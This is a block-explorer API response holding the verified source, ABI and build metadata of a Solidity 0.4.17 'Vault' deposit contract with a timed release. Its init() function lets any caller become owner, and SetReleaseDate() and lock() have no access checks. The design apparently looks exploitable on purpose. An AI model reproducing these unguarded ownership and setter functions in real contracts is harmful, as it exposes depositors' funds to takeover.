{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.17;\r\n\r\ncontract Vault {\r\n    \r\n    event Deposit(address indexed depositor, uint amount);\r\n    event Withdrawal(address indexed to, uint amount);\r\n    event TransferOwnership(address indexed from, address indexed to);\r\n    \r\n    address Owner;\r\n    function transferOwnership(address to) public onlyOwner {\r\n        TransferOwnership(Owner, to); Owner = to;\r\n    }\r\n    \r\n    mapping (address => uint) public Deposits;\r\n    uint minDeposit;\r\n    bool Locked;\r\n    uint Date;\r\n\r\n    function init() payable open {\r\n        Owner = msg.sender;\r\n        minDeposit = 0.5 ether;\r\n        Locked = false;\r\n        deposit();\r\n    }\r\n\r\n    function SetReleaseDate(uint NewDate) {\r\n        Date = NewDate;\r\n    }\r\n\r\n    function() public payable { deposit(); }\r\n\r\n    function deposit() public payable {\r\n        if (msg.value > 0) {\r\n            if (msg.value >= MinimumDeposit())\r\n                Deposits[msg.sender] += msg.value;\r\n            Deposit(msg.sender, msg.value);\r\n        }\r\n    }\r\n\r\n    function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }\r\n    \r\n    function withdrawTo(address to, uint amount) public onlyOwner {\r\n        if (WithdrawalEnabled()) {\r\n            uint max = Deposits[msg.sender];\r\n            if (max > 0 && amount <= max) {\r\n                to.transfer(amount);\r\n                Withdrawal(to, amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function MinimumDeposit() public constant returns (uint) { return minDeposit; }\r\n    function ReleaseDate() public constant returns (uint) { return Date; }\r\n    function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }\r\n    function lock() public { Locked = true; }\r\n    modifier onlyOwner { if (msg.sender == Owner) _; }\r\n    modifier open { if (!Locked) _; }\r\n    function kill() { require(this.balance == 0); selfdestruct(Owner); }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdrawTo\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"Deposits\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"ReleaseDate\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"MinimumDeposit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"NewDate\",\"type\":\"uint256\"}],\"name\":\"SetReleaseDate\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"lock\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"depositor\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Deposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdrawal\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"}],\"name\":\"TransferOwnership\",\"type\":\"event\"}]","ContractName":"Vault","CompilerVersion":"v0.4.17+commit.bdeb9e52","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://86a3c1d0b68d24a7742db5e9cc03775d795455161cde25d91ea1ab7360f1d27e"}]}